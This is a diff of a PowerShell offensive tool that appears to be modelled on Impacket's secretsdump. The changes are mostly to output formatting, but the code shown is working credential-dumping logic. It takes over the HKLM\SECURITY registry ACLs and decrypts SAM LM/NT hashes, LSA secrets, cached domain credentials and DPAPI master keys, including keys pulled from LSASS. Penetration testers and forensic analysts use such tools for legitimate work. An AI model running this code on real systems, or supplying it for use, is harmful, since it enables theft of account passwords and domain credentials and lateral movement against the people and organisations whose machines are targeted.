 		If (@(Compare-Object $NewCheckSum $HBootKey[16..$($HBootKey.Length-1)] -SyncWindow 0).Length -ne 0)
 		{
-			Write-Error "Hashed BootKey checksum failed, Syskey startup password probably in use"
+			Write-Host ("[-] Hashed BootKey checksum failed, Syskey startup password probably in use`n")
 			return $Null
 		}
 
-		Write-Host ("[+] Hashed Boot Key = {0}" -f ([System.BitConverter]::ToString($HBootKey).Replace("-", "")))
+		Write-Host ("[+] Hashed Boot Key = {0}`n" -f ([System.BitConverter]::ToString($HBootKey).Replace("-", "")))
 		return $HBootKey
 	}
 	# Else : This is Windows 2016 TP5 on in theory (it is reported that some W10 and 2012R2 might behave this way also), according to "secretsdump.py"
@@ -1909,12 +2387,12 @@ function Get-HBootKey($BootKey)
 		# Hashed BootKey = AESDecrypt (BootKey, Data, Salt)
 		$HBootKey = AESTransform $BootKey $Data[0..$([BitConverter]::ToUInt32($DataLen, 0) - 1)] $Salt ([Security.Cryptography.CipherMode]::CBC) $False
 
-		Write-Host ("[+] Hashed Boot Key = {0}" -f ([System.BitConverter]::ToString($HBootKey).Replace("-", "")))
+		Write-Host ("[+] Hashed Boot Key = {0}`n" -f ([System.BitConverter]::ToString($HBootKey).Replace("-", "")))
 		return $HBootKey
 	}
 	Else
 	{
-		Write-Error '"F" key from "HKLM\SAM\SAM\Domains\Account" registry parsing error'
+		Write-Host ("[-] 'F' key from 'HKLM\SAM\SAM\Domains\Account' registry parsing error`n")
 		return $Null
 	}
 }
@@ -1922,7 +2400,7 @@ function Get-HBootKey($BootKey)
 function Get-UsersKeys
 {
 	<#
-		Get-UsersKeys: Retrieve users' LM/NT Hashes encrypted/obfuscated (structure USER_ACCOUNT_V) into registry key "HKLM\SAM\SAM\Domains\Account\Users\<RID>\V"
+		Get-UsersKeys: Recover users' LM/NT Hashes encrypted/obfuscated (structure USER_ACCOUNT_V) into registry key "HKLM\SAM\SAM\Domains\Account\Users\<RID>\V"
 			1- Get users' LM/NT Hashes encrypted/obfuscated (structure USER_ACCOUNT_V) into registry key "HKLM\SAM\SAM\Domains\Account\Users\<RID>\V"
 	#>
 
@@ -2002,20 +2480,19 @@ function Get-UserHashesDeobfuscated($UserKey, $HBootKey, $RID)
 {
 	<#
 		Get-UserHashesDeobfuscated: Deobfuscate single UserKey = LM/NT Hashes encrypted/obfuscated (structure USER_ACCOUNT_V) and decrypt them
-			1- Get-HBootKey with BootKey
-			2- Get LM/NT hashes, from $UserKey["Data"] = LM/NT Hashes encrypted/obfuscated (structure USER_ACCOUNT_V), depending on Windows version:
-				2.1- If < Windows 10 v1607
+			1- Get LM/NT hashes, from $UserKey["Data"] = LM/NT Hashes encrypted/obfuscated (structure USER_ACCOUNT_V), depending on Windows version:
+				1.1- If < Windows 10 v1607
 					- From structure SAM_HASH get potential LM/NT hashes encrypted/obfuscated
-				2.2- If >= Windows 10 v1607
+				1.2- If >= Windows 10 v1607
 					- From structure SAM_HASH_AES get potential LM/NT hashes encrypted/obfuscated
-			3- Compute DES keys from user's RID
-			4- Decrypt LM/NT hashes encrypted/obfuscated, depending on Windows version:
-				4.1- If < Windows 10 v1607
+			2- Compute DES keys from user's RID
+			3- Decrypt LM/NT hashes encrypted/obfuscated, depending on Windows version:
+				3.1- If < Windows 10 v1607
 					- RC4Key_LM/NT = MD5 (HashedBootKey[0:0x10] + RID + ALMPASSWORD/ANTPASSWORD)
 					- Obf_LMHash/NTHash = RC4Encrypt (RC4Key_LM/NT, Enc_LMHash/NTHash)
-				4.2- If >= Windows 10 v1607
+				3.2- If >= Windows 10 v1607
 					- Obf_LMHash/NTHash = AESDecrypt (HashedBootKey[0:0x10], Enc_LMHash/NTHash, SAM_HASH_AES_LM/NT[Salt])[0:0x10]
-			5- Deobfuscate LMHash/NTHash = DESDecrypt (DESKeys[0], Obf_LMHash/NTHash[0:8]) + DESDecrypt (DESKeys[1], Obf_LMHash/NTHash[8:16])
+			4- Deobfuscate LMHash/NTHash = DESDecrypt (DESKeys[0], Obf_LMHash/NTHash[0:8]) + DESDecrypt (DESKeys[1], Obf_LMHash/NTHash[8:16])
 	#>
 
 	# Constants
@@ -2024,112 +2501,105 @@ function Get-UserHashesDeobfuscated($UserKey, $HBootKey, $RID)
 	$emptyLM = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee);
 	$emptyNT = [byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0);
 
-	If ($HBootKey)
+	[byte[]]$Enc_LMHash = $Null
+	[byte[]]$Enc_NTHash = $Null
+
+	# Recover encrypted hashes depending Windows versions
+	# Old style = < Windows 10 v1607
+	# New style = >= Windows 10 v1607
+	$NewStyle = $False
+	If ($UserKey["Data"][[BitConverter]::ToUInt32($UserKey["NTHashOffset"], 0) + 2] -eq [byte]0x01)
 	{
-		[byte[]]$Enc_LMHash = $Null
-		[byte[]]$Enc_NTHash = $Null
-
-		# Retrieve encrypted hashes depending Windows versions
-		# Old style = < Windows 10 v1607
-		# New style = >= Windows 10 v1607
-		$NewStyle = $False
-		If ($UserKey["Data"][[BitConverter]::ToUInt32($UserKey["NTHashOffset"], 0) + 2] -eq [byte]0x01)
+		# Old style hashes
+		If ([BitConverter]::ToUInt32($UserKey["LMHashLength"], 0) -eq 20)
 		{
-			# Old style hashes
-			If ([BitConverter]::ToUInt32($UserKey["LMHashLength"], 0) -eq 20)
-			{
-				# LM Hash have been setted
-				# Structure from Impacket "secretsdump.py" : SAM_HASH
-				$LMHashOffset = [BitConverter]::ToUInt32($UserKey["LMHashOffset"], 0)
-				$LMHashLength = [BitConverter]::ToUInt32($UserKey["LMHashLength"], 0)
-				$SAM_HASH_LM = $UserKey["Data"][$LMHashOffset..$(($LMHashOffset + $LMHashLength)-1)]
-				$PekID_LM = $SAM_HASH_LM[0..1]
-				$Revision_LM = $SAM_HASH_LM[2..3]
-				$Enc_LMHash = $SAM_HASH_LM[4..$($SAM_HASH_LM.Length - 1)]
+			# LM Hash have been setted
+			# Structure from Impacket "secretsdump.py" : SAM_HASH
+			$LMHashOffset = [BitConverter]::ToUInt32($UserKey["LMHashOffset"], 0)
+			$LMHashLength = [BitConverter]::ToUInt32($UserKey["LMHashLength"], 0)
+			$SAM_HASH_LM = $UserKey["Data"][$LMHashOffset..$(($LMHashOffset + $LMHashLength)-1)]
+			$PekID_LM = $SAM_HASH_LM[0..1]
+			$Revision_LM = $SAM_HASH_LM[2..3]
+			$Enc_LMHash = $SAM_HASH_LM[4..$($SAM_HASH_LM.Length - 1)]
 
-			}
-			If ([BitConverter]::ToUInt32($UserKey["NTHashLength"], 0) -eq 20)
-			{
-				# NT Hash have been setted
-				# Structure from Impacket "secretsdump.py" : SAM_HASH
-				$NTHashOffset = [BitConverter]::ToUInt32($UserKey["NTHashOffset"], 0)
-				$NTHashLength = [BitConverter]::ToUInt32($UserKey["NTHashLength"], 0)
-				$SAM_HASH_NT = $UserKey["Data"][$NTHashOffset..$(($NTHashOffset + $NTHashLength)-1)]
-				$PekID_NT = $SAM_HASH_NT[0..1]
-				$Revision_NT = $SAM_HASH_NT[2..3]
-				$Enc_NTHash = $SAM_HASH_NT[4..$($SAM_HASH_NT.Length - 1)]
-			}
 		}
-		Else
+		If ([BitConverter]::ToUInt32($UserKey["NTHashLength"], 0) -eq 20)
 		{
-			# New style hashes
-			$NewStyle = $True
-			If ([BitConverter]::ToUInt32($UserKey["LMHashLength"], 0) -gt 24)
-			{
-				# LM Hash have been setted
-				# Structure from Impacket "secretsdump.py" : SAM_HASH_AES
-				$LMHashOffset = [BitConverter]::ToUInt32($UserKey["LMHashOffset"], 0)
-				$LMHashLength = [BitConverter]::ToUInt32($UserKey["LMHashLength"], 0)
-				$SAM_HASH_AES_LM = $UserKey["Data"][$LMHashOffset..$(($LMHashOffset + $LMHashLength)-1)]
-				$PekID_LM = $SAM_HASH_AES_LM[0..1]
-				$Revision_LM = $SAM_HASH_AES_LM[2..3]
-				$DataOffset_LM = $SAM_HASH_AES_LM[4..7]
-				$Salt_LM = $SAM_HASH_AES_LM[8..23]
-				$Enc_LMHash = $SAM_HASH_AES_LM[24..$($SAM_HASH_AES_LM.Length - 1)]
-			}
-			If ([BitConverter]::ToUInt32($UserKey["NTHashLength"], 0) -gt 24)
-			{
-				# NT Hash have been setted
-				# Structure from Impacket "secretsdump.py" : SAM_HASH_AES
-				$NTHashOffset = [BitConverter]::ToUInt32($UserKey["NTHashOffset"], 0)
-				$NTHashLength = [BitConverter]::ToUInt32($UserKey["NTHashLength"], 0)
-				$SAM_HASH_AES_NT = $UserKey["Data"][$NTHashOffset..$(($NTHashOffset + $NTHashLength)-1)]
-				$PekID_NT = $SAM_HASH_AES_NT[0..1]
-				$Revision_NT = $SAM_HASH_AES_NT[2..3]
-				$DataOffset_NT = $SAM_HASH_AES_NT[4..7]
-				$Salt_NT = $SAM_HASH_AES_NT[8..23]
-				$Enc_NTHash = $SAM_HASH_AES_NT[24..$($SAM_HASH_AES_NT.Length - 1)]
-			}
+			# NT Hash have been setted
+			# Structure from Impacket "secretsdump.py" : SAM_HASH
+			$NTHashOffset = [BitConverter]::ToUInt32($UserKey["NTHashOffset"], 0)
+			$NTHashLength = [BitConverter]::ToUInt32($UserKey["NTHashLength"], 0)
+			$SAM_HASH_NT = $UserKey["Data"][$NTHashOffset..$(($NTHashOffset + $NTHashLength)-1)]
+			$PekID_NT = $SAM_HASH_NT[0..1]
+			$Revision_NT = $SAM_HASH_NT[2..3]
+			$Enc_NTHash = $SAM_HASH_NT[4..$($SAM_HASH_NT.Length - 1)]
 		}
-
-		[byte[]]$LMHash = $emptyLM
-		[byte[]]$NTHash= $emptyNT
-		$DESKeys = RIDToDESKeys($RID)
-		If ($Enc_LMHash)
-		{
-			If (-not $NewStyle)
-			{
-				$RC4Key_LM = [Security.Cryptography.MD5]::Create().ComputeHash($HBootKey[0..0x0f] + [BitConverter]::GetBytes($RID) + $ALMPASSWORD);
-				$Obf_LMHash = (NewRC4 $RC4Key_LM).Transform($Enc_LMHash)
-			}
-			Else
-			{
-				$Obf_LMHash = (AESTransform $HBootKey[0..0x0f] $Enc_LMHash $Salt_LM ([Security.Cryptography.CipherMode]::CBC) $False)[0..0x0f]
-			}
-
-			$LMHash = (DESTransform $DESKeys[0] $Obf_LMHash[0..7] $DESKeys[0] $False) + (DESTransform $DESKeys[1] $Obf_LMHash[8..$($Obf_LMHash.Length - 1)] $DESKeys[1] $False)
-		}
-		If ($Enc_NTHash)
-		{
-			If (-not $NewStyle)
-			{
-				$RC4Key_NT = [Security.Cryptography.MD5]::Create().ComputeHash($HBootKey[0..0x0f] + [BitConverter]::GetBytes($RID) + $ANTPASSWORD)
-				$Obf_NTHash = (NewRC4 $RC4Key_NT).Transform($Enc_NTHash)
-			}
-			Else
-			{
-				$Obf_NTHash = (AESTransform $HBootKey[0..0x0f] $Enc_NTHash $Salt_NT ([Security.Cryptography.CipherMode]::CBC) $False)[0..0x0f]
-			}
-
-			$NTHash = (DESTransform $DESKeys[0] $Obf_NTHash[0..7] $DESKeys[0] $False) + (DESTransform $DESKeys[1] $Obf_NTHash[8..$($Obf_NTHash.Length - 1)] $DESKeys[1] $False)
-		}
-
-		return ($LMHash, $NTHash)
 	}
 	Else
 	{
-		return ($Null, $Null)
+		# New style hashes
+		$NewStyle = $True
+		If ([BitConverter]::ToUInt32($UserKey["LMHashLength"], 0) -gt 24)
+		{
+			# LM Hash have been setted
+			# Structure from Impacket "secretsdump.py" : SAM_HASH_AES
+			$LMHashOffset = [BitConverter]::ToUInt32($UserKey["LMHashOffset"], 0)
+			$LMHashLength = [BitConverter]::ToUInt32($UserKey["LMHashLength"], 0)
+			$SAM_HASH_AES_LM = $UserKey["Data"][$LMHashOffset..$(($LMHashOffset + $LMHashLength)-1)]
+			$PekID_LM = $SAM_HASH_AES_LM[0..1]
+			$Revision_LM = $SAM_HASH_AES_LM[2..3]
+			$DataOffset_LM = $SAM_HASH_AES_LM[4..7]
+			$Salt_LM = $SAM_HASH_AES_LM[8..23]
+			$Enc_LMHash = $SAM_HASH_AES_LM[24..$($SAM_HASH_AES_LM.Length - 1)]
+		}
+		If ([BitConverter]::ToUInt32($UserKey["NTHashLength"], 0) -gt 24)
+		{
+			# NT Hash have been setted
+			# Structure from Impacket "secretsdump.py" : SAM_HASH_AES
+			$NTHashOffset = [BitConverter]::ToUInt32($UserKey["NTHashOffset"], 0)
+			$NTHashLength = [BitConverter]::ToUInt32($UserKey["NTHashLength"], 0)
+			$SAM_HASH_AES_NT = $UserKey["Data"][$NTHashOffset..$(($NTHashOffset + $NTHashLength)-1)]
+			$PekID_NT = $SAM_HASH_AES_NT[0..1]
+			$Revision_NT = $SAM_HASH_AES_NT[2..3]
+			$DataOffset_NT = $SAM_HASH_AES_NT[4..7]
+			$Salt_NT = $SAM_HASH_AES_NT[8..23]
+			$Enc_NTHash = $SAM_HASH_AES_NT[24..$($SAM_HASH_AES_NT.Length - 1)]
+		}
 	}
+
+	[byte[]]$LMHash = $emptyLM
+	[byte[]]$NTHash= $emptyNT
+	$DESKeys = RIDToDESKeys($RID)
+	If ($Enc_LMHash)
+	{
+		If (-not $NewStyle)
+		{
+			$RC4Key_LM = [Security.Cryptography.MD5]::Create().ComputeHash($HBootKey[0..0x0f] + [BitConverter]::GetBytes($RID) + $ALMPASSWORD);
+			$Obf_LMHash = (NewRC4 $RC4Key_LM).Transform($Enc_LMHash)
+		}
+		Else
+		{
+			$Obf_LMHash = (AESTransform $HBootKey[0..0x0f] $Enc_LMHash $Salt_LM ([Security.Cryptography.CipherMode]::CBC) $False)[0..0x0f]
+		}
+
+		$LMHash = (DESTransform $DESKeys[0] $Obf_LMHash[0..7] $DESKeys[0] $False) + (DESTransform $DESKeys[1] $Obf_LMHash[8..$($Obf_LMHash.Length - 1)] $DESKeys[1] $False)
+	}
+	If ($Enc_NTHash)
+	{
+		If (-not $NewStyle)
+		{
+			$RC4Key_NT = [Security.Cryptography.MD5]::Create().ComputeHash($HBootKey[0..0x0f] + [BitConverter]::GetBytes($RID) + $ANTPASSWORD)
+			$Obf_NTHash = (NewRC4 $RC4Key_NT).Transform($Enc_NTHash)
+		}
+		Else
+		{
+			$Obf_NTHash = (AESTransform $HBootKey[0..0x0f] $Enc_NTHash $Salt_NT ([Security.Cryptography.CipherMode]::CBC) $False)[0..0x0f]
+		}
+
+		$NTHash = (DESTransform $DESKeys[0] $Obf_NTHash[0..7] $DESKeys[0] $False) + (DESTransform $DESKeys[1] $Obf_NTHash[8..$($Obf_NTHash.Length - 1)] $DESKeys[1] $False)
+	}
+
+	return ($LMHash, $NTHash)
 }
 
 function Get-SAM($BootKey)
@@ -2141,8 +2611,12 @@ function Get-SAM($BootKey)
 
 	# Compute Hashed BootKey
 	$HBootKey = Get-HBootkey $BootKey
+	if (-not $HBootKey)
+	{
+		return $Null
+	}
 
-	Write-Host "`n[===] Retrieve user's LM/NT Hashes and decrypt them with Boot Key [===]"
+	Write-Host "[===] Recover user's LM/NT Hashes and decrypt them with Boot Key [===]"
 
 	# Get users keys
 	$UsersKeys = Get-UsersKeys
@@ -2171,6 +2645,8 @@ function Get-SAM($BootKey)
 		}
 	}
 
+	Write-Host ""
+
 	return $SAM
 }
 
@@ -2196,8 +2672,9 @@ function Get-LSASecretKey($BootKey)
 {
 	<#
 		Get-LSASecretKey: Get required LSA Secret Key for decrypting LSA Secrets with BootKey
-			1- Get encrypted LSA Secret Key depending on Windows version:
-				1.1- If >= Windows Vista (Check if HKLM\Security\Policy\PolEKList or HKLM\Security\Policy\PolSecretEncryptionKey exist)
+			1- Recover encrypted LSA Secret Key from HKLM\Security\Policy\PolEKList (Vista style) or HKLM\Security\Policy\PolSecretEncryptionKey
+			2- Decrypt LSA Secret Key depending on Windows version:
+				2.1- If >= Windows Vista
 					- Encrypted LSA Secret Key = Default property of registry HKLM\Security\Policy\PolEKList
 					- Structure LSA_SECRET = Enc_LSASecretKey
 					- Update = BootKey
@@ -2210,7 +2687,7 @@ function Get-LSASecretKey($BootKey)
 						- Plaintext += AESDecrypt (Key, Block, "\x00" * 16)
 					- Structure LSA_SECRET_BLOB = PlainText
 					- LSASecretKey = LSA_SECRET_BLOB["Secret"][52:][:32]
-				1.2- Else
+				2.2- Else
 					- Encrypted LSA Secret Key = Default property of registry of registry HKLM\Security\Policy\PolSecretEncryptionKey
 					- Update = BootKey
 					- for i in range (1000) : Update += Enc_LSASecretKey[60:76]
@@ -2220,7 +2697,7 @@ function Get-LSASecretKey($BootKey)
 
 	#>
 
-	Write-Host "`n[===] Retrieve LSA Secret Key with Boot Key [===]"
+	Write-Host "[===] Recover LSA Secret Key with Boot Key [===]"
 
 	# Set full control for registry "HKLM\SECURITY\Policy" and subregistry/subkeys
 	$SubKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SECURITY\Policy', 'ReadWriteSubTree', 'ChangePermissions')
@@ -2232,6 +2709,7 @@ function Get-LSASecretKey($BootKey)
 	[byte[]]$Enc_LSASecretKey = $Null
 	$Global:VistaStyle = $True
 
+	# Recover encrypted LSA Secret Key from HKLM\Security\Policy\PolEKList (Vista style) or HKLM\Security\Policy\PolSecretEncryptionKey
 	$Enc_LSASecretKey = Get-RegKeyPropertyValue "HKLM" "SECURITY\Policy\PolEKList" ""
 	If (-not $Enc_LSASecretKey)
 	{
@@ -2243,7 +2721,7 @@ function Get-LSASecretKey($BootKey)
 			$SubKey.SetAccessControl($ACL)
 			$SubKey.Close()
 
-			Write-Error "Unable to retrieve encrypted LSA Secret Key"
+			Write-Host "[-] Unable to recover encrypted LSA Secret Key`n"
 			return $Null
 		}
 		Else
@@ -2309,7 +2787,7 @@ function Get-LSASecretKey($BootKey)
 	}
 
 	$HexLSASecretKey = [System.BitConverter]::ToString($LSASecretKey).Replace("-", "")
-	Write-Host ("[+] LSA Secret Key = {0}" -f ($HexLSASecretKey))
+	Write-Host ("[+] LSA Secret Key = {0}`n" -f ($HexLSASecretKey))
 
 	return $LSASecretKey
 }
@@ -2443,12 +2921,12 @@ function Get-LSASecrets($LSASecretKey)
 {
 	<#
 		Get-LSASecrets: Get LSA Secrets and decrypt them with LSA Secret Key
-			1- Parse default property of registry SECURITY\Policy\Secrets\<LSASecretType>\CurrVal (Don't use OldVal)
+			1- Parse default property of registry HKLM\SECURITY\Policy\Secrets\<LSASecretType>\CurrVal (Don't use OldVal)
 			2- Decrypt each secret with LSA Secret Key
 		All stuff is in Decrypt-LSASecret
 	#>
 
-	Write-Host "`n[===] Enumerate LSA Secrets and decrypt them with LSA Secret Key [===]"
+	Write-Host "[===] Enumerate LSA Secrets and decrypt them with LSA Secret Key [===]"
 
 	# Set full control for registry "HKLM\SECURITY\Policy\Secrets" and subregistry/subkeys
 	$SubKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SECURITY\Policy\Secrets', 'ReadWriteSubTree', 'ChangePermissions')
@@ -2577,6 +3055,8 @@ function Get-LSASecrets($LSASecretKey)
 	$SubKey.SetAccessControl($ACL)
 	$SubKey.Close()
 
+	Write-Host ""
+
 	return $LSASecrets
 }
 
@@ -2607,7 +3087,7 @@ function Get-CachedDomainCreds($NLKM)
 				- DomainName = Plaintext[:pad(NL_RECORD[DnsDomainNameLength])].decode ("UTF-16LE")
 	#>
 
-	Write-Host ("`n[===] Enumerate Cached Domain Credentials and decrypt them with {0} Key from LSA Secrets [===]" -f ('NL$KM'))
+	Write-Host ("[===] Enumerate Cached Domain Credentials and decrypt them with NL`$KM Key from LSA Secrets [===]")
 
 	# Set full control for registry "HKLM\SECURITY\Cache" and subregistry/subkeys
 	$SubKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SECURITY\Cache', 'ReadWriteSubTree', 'ChangePermissions')
@@ -2699,7 +3179,7 @@ function Get-CachedDomainCreds($NLKM)
 					}
 					Else
 					{
-						Write-Error ("Unknown NL_RECORD[Flags] for entry {0}" -f ($_.Name))
+						Write-Host ("Unknown NL_RECORD[Flags] for entry {0}" -f ($_.Name))
 					}
 				}
 			}
@@ -2711,9 +3191,16 @@ function Get-CachedDomainCreds($NLKM)
 	$SubKey.SetAccessControl($ACL)
 	$SubKey.Close()
 
-	If ($CachedDomainCreds.Count -eq 0) { Write-Host "[-] No cached domain credentials saved" }
-
-	return $CachedDomainCreds
+	If ($CachedDomainCreds.Count -eq 0)
+	{
+		Write-Host "[-] No cached domain credentials saved`n"
+		return $Null
+	}
+	Else
+	{
+		Write-Host ""
+		return $CachedDomainCreds
+	}
 }
 
 <#################>
@@ -2743,7 +3230,7 @@ function Get-CachedDomainCreds($NLKM)
 		- DomainBackupMasterKey encrypted with RSA public key of DC (RSA keys pair generated and send to DC when generating Master Key)
 		- LocalBackupEncryptionKey encrypted with System Machine PreKey from DPAPI_SYSTEM of LSA Storage
 		- CREDHIST GUID
-			- In Windows 2000, It stored the LocalBackupMasterKey encrypted, which could be decrypted by any administrator with the LocalBackupEncryptionKey and allowed to retrieve every Users' MasterKeys
+			- In Windows 2000, It stored the LocalBackupMasterKey encrypted, which could be decrypted by any administrator with the LocalBackupEncryptionKey and allowed to Recover every Users' MasterKeys
 			- After Windows 2000, It point to a CREDHIST File which contain Old User's PreKeys chain encrypted with user current's password
 	- For each MasterKey File : Master Key/Domain Backup Master Key/Local Backup Master Key (Windows 2000) point to the same Master Key value once decrypted
 	- DPAPI encryption/decryption context
@@ -2766,7 +3253,7 @@ function Get-CachedDomainCreds($NLKM)
 
 	Get-DPAPISecrets:
 		1- Compute PreKeys (Users' PreKeys with gathered Pwds/NTHashes and System PreKeys with DPAPI_SYSTEM from LSA Storage)
-		2- Retrieve all MasterKey Files and try to decrypt each part (Master Key/Domain Backup Master Key/Local Backup Master Key (Windows 2000)) with PreKeys to obtain the decrypted MasterKey value
+		2- Recover all MasterKey Files and try to decrypt each part (Master Key/Domain Backup Master Key/Local Backup Master Key (Windows 2000)) with PreKeys to obtain the decrypted MasterKey value
 			- For System MasterKey' Files we know that we have to use System PreKeys (and we always have them)
 			- For Users MasterKey' we don't know which User PreKeys to use (and we may have not them), BUT we can validate the decryption success
 		3- Find DPAPI Secrets
@@ -2774,7 +3261,7 @@ function Get-CachedDomainCreds($NLKM)
 			- Wi-Fi passwords have known locations
 		4- Decrypt the DPAPI Secret (or DPAPI Blob) with the corresponding MasterKey (MKGUID) decrypted (If we have It)
 
-	NOTE: MasterKeys can be stored and retrieved from LSASS (implemented)
+	NOTE: MasterKeys can be stored and Recoverd from LSASS (implemented)
 #>
 
 <### Get MasterKeys decrypted ###>
@@ -2845,7 +3332,7 @@ function Get-PreKeys($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes)
 				$HMACSHA1 = [System.Security.Cryptography.HMACSHA1]::Create()
 				$HMACSHA1.Key = $SHA1_Pwd
 				$Key = @{}
-				$Key["Type"] = ("User PreKey 1 from provided pwd ({0}) - {1}" -f ($Pwd["Origin"], $SID))
+				$Key["Type"] = ("User PreKey 1 from pwd ({0}) - {1}" -f ($Pwd["Origin"], $SID))
 				$Key["Value"] = $HMACSHA1.ComputeHash([Text.Encoding]::Unicode.GetBytes($SID + [Char]0x0))
 				$PreKeys += ,($Key)
 				ForEach ($PreKey in $PreKeys)
@@ -2860,7 +3347,7 @@ function Get-PreKeys($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes)
 				$HMACSHA1 = [System.Security.Cryptography.HMACSHA1]::Create()
 				$HMACSHA1.Key = $NTH
 				$Key = @{}
-				$Key["Type"] = ("User PreKey 2 from provided pwd ({0}) - {1}" -f ($Pwd["Origin"], $SID))
+				$Key["Type"] = ("User PreKey 2 from pwd ({0}) - {1}" -f ($Pwd["Origin"], $SID))
 				$Key["Value"] = $HMACSHA1.ComputeHash([Text.Encoding]::Unicode.GetBytes($SID + [Char]0x0))
 				$AlreadyExist = $False
 				ForEach ($PreKey in $PreKeys)
@@ -2876,7 +3363,7 @@ function Get-PreKeys($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes)
 				$TmpKey2 = (PBKDF2_HMAC_SHA256 $TmpKey ([Text.Encoding]::Unicode.GetBytes($SID)) 256 1)[0..15]
 				$HMACSHA1.Key = $TmpKey2
 				$Key = @{}
-				$Key["Type"] = ("User PreKey 3 from provided pwd ({0}) - {1}" -f ($Pwd["Origin"], $SID))
+				$Key["Type"] = ("User PreKey 3 from pwd ({0}) - {1}" -f ($Pwd["Origin"], $SID))
 				$Key["Value"] = $HMACSHA1.ComputeHash([Text.Encoding]::Unicode.GetBytes($SID + [Char]0x0))
 				$AlreadyExist = $False
 				ForEach ($PreKey in $PreKeys)
@@ -2901,7 +3388,7 @@ function Get-PreKeys($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes)
 				$HMACSHA1 = [System.Security.Cryptography.HMACSHA1]::Create()
 				$HMACSHA1.Key = $NTH
 				$Key = @{}
-				$Key["Type"] = ("User PreKey 2 from provided NT hash ({0}) - {1}" -f ($NTHash["Origin"], $SID))
+				$Key["Type"] = ("User PreKey 2 from NT hash ({0}) - {1}" -f ($NTHash["Origin"], $SID))
 				$Key["Value"] = $HMACSHA1.ComputeHash([Text.Encoding]::Unicode.GetBytes($SID + [Char]0x0))
 				$AlreadyExist = $False
 				ForEach ($PreKey in $PreKeys)
@@ -2917,7 +3404,7 @@ function Get-PreKeys($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes)
 				$TmpKey2 = (PBKDF2_HMAC_SHA256 $TmpKey ([Text.Encoding]::Unicode.GetBytes($SID)) 256 1)[0..15]
 				$HMACSHA1.Key = $TmpKey2
 				$Key = @{}
-				$Key["Type"] = ("User PreKey 3 from provided NT hash ({0}) - {1}" -f ($NTHash["Origin"], $SID))
+				$Key["Type"] = ("User PreKey 3 from NT hash ({0}) - {1}" -f ($NTHash["Origin"], $SID))
 				$Key["Value"] = $HMACSHA1.ComputeHash([Text.Encoding]::Unicode.GetBytes($SID + [Char]0x0))
 				$AlreadyExist = $False
 				ForEach ($PreKey in $PreKeys)
@@ -3006,12 +3493,12 @@ function Decrypt-MasterKey($MKType, $PreKeys, $Enc_Key, $HashAlgo, $CipherAlgo, 
 		$HMAC_Calc = $Hasher.ComputeHash($Decrypted_MasterKey)
 		If (@(Compare-Object $HMAC_Calc[0..$($Global:ALGORITHMS_DATA[$HashAlgo][0]-1)] $HMAC_Res -SyncWindow 0).Length -eq 0)
 		{
-			Write-Host ("[...] Decrypted {0} with PreKey {1} = {2}" -f ($MKType, ([System.BitConverter]::ToString($PreKey["Value"]).Replace("-", "")), ([System.BitConverter]::ToString($Decrypted_MasterKey).Replace("-", ""))))
+			Write-Host ("`t[+] Decrypted {0} with PreKey {1} = {2}" -f ($MKType, ([System.BitConverter]::ToString($PreKey["Value"]).Replace("-", "")), ([System.BitConverter]::ToString($Decrypted_MasterKey).Replace("-", ""))))
 			return $Decrypted_MasterKey
 		}
 	}
 
-	Write-Host ("[...] None PreKeys allowed to decrypt {0}" -f ($MKType))
+	Write-Host ("`t[-] None PreKeys allowed to decrypt {0}" -f ($MKType))
 	return $Null
 }
 
@@ -3121,14 +3608,14 @@ function Get-MasterKeysFromFiles($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes, $LSA
 				- C:\Windows\System32\Microsoft\Protect\<MKGUID> (System Machine Master Key File)
 	#>
 
-	Write-Host ("`n[===] Try to decrypt all Master Keys Files with LSA DPAPI System Machine/User Keys and user's passwords/NT Hashes [===]")
+	Write-Host ("[===] Try to decrypt all Master Keys Files with LSA DPAPI PreKeys [===]")
 
-	# Retrieve all Pre Keys
+	# Recover all Pre Keys
 	Write-Host ("[+] Compute PreKeys")
 	$PreKeys = Get-PreKeys $LSA_DPAPI_SYSTEM $SAM $Pwds $NTHashes
 	ForEach ($PreKey in $PreKeys)
 	{
-		Write-Host ("[...] {0} = {1}" -f ($PreKey["Type"], [System.BitConverter]::ToString($PreKey["Value"]).Replace("-", "")))
+		Write-Host ("`t[+] {0} = {1}" -f ($PreKey["Type"], [System.BitConverter]::ToString($PreKey["Value"]).Replace("-", "")))
 	}
 
 	$MasterKeys = @{}
@@ -3154,7 +3641,7 @@ function Get-MasterKeysFromFiles($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes, $LSA
 						If ($MKGUID -eq $LSASS_MasterKey["Key_GUID"])
 						{
 							$Found = $True
-							Write-Host ("[...] Decrypted MasterKey found from LSASS = {0}" -f ([System.BitConverter]::ToString($LSASS_MasterKey["MasterKey"]).Replace("-", "")))
+							Write-Host ("`t[+] Decrypted MasterKey found from LSASS = {0}" -f ([System.BitConverter]::ToString($LSASS_MasterKey["MasterKey"]).Replace("-", "")))
 							$Keys = @{}
 							$Keys["MasterKey"] =  $LSASS_MasterKey["MasterKey"]
 							$UserMasterKeys[$MKGUID] = $Keys
@@ -3199,7 +3686,7 @@ function Get-MasterKeysFromFiles($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes, $LSA
 								If ($MKGUID -eq $LSASS_MasterKey["Key_GUID"])
 								{
 									$Found = $True
-									Write-Host ("[...] Decrypted MasterKey found from LSASS = {0}" -f ([System.BitConverter]::ToString($LSASS_MasterKey["MasterKey"]).Replace("-", "")))
+									Write-Host ("`t[+] Decrypted MasterKey found from LSASS = {0}" -f ([System.BitConverter]::ToString($LSASS_MasterKey["MasterKey"]).Replace("-", "")))
 									$Keys = @{}
 									$Keys["MasterKey"] =  $LSASS_MasterKey["MasterKey"]
 									$SystemMasterKeys[$MKGUID] = $Keys
